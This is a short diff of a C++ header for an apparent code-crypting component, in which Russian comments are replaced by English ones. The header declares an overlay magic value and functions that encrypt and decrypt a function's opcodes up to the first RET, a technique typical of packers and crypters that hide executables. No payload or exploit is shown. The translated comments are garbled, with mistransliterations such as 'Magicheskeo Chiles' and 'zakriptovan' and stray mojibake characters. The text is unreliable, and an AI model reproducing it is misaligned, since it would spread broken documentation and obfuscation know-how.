@@ -7,8 +7,8 @@ namespace BaseOverlay
 {  
   enum
   {
-    MAGIC_DWORD          = 0x45564144, //Магическео чилсо (DAVE).
-    FULL_SIZE_OF_OVERLAY = 512,        //Полный максимальный размер оверлея после крипта.
+    MAGIC_DWORD          = 0x45564144, //Magicheskeo Chiles (DAVE).
+    FULL_SIZE_OF_OVERLAY = 512,        //Full maximum size of the overlay after the crypt.
   };
   
   /*
@@ -68,13 +68,12 @@ namespace BaseOverlay
   */
   void _decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key);
 
-  /*
-    Шифрование опкодов до первой встречи RET.
+  /*В В В В Encryption opcodes up to the first meeting of RET.
 
-    IN OUT curOpcode - точка старта.
-    IN key           - ключ.
+В В В В IN OUT curOpcode - a starting point.
+В В В В IN key - the key.
 
-    Return           - количество закриптованных байт.
-  */
+В В В В Return - zakriptovan number of bytes.
+В В */
   DWORD _encryptFunction(LPBYTE curOpcode, DWORD key);
 };
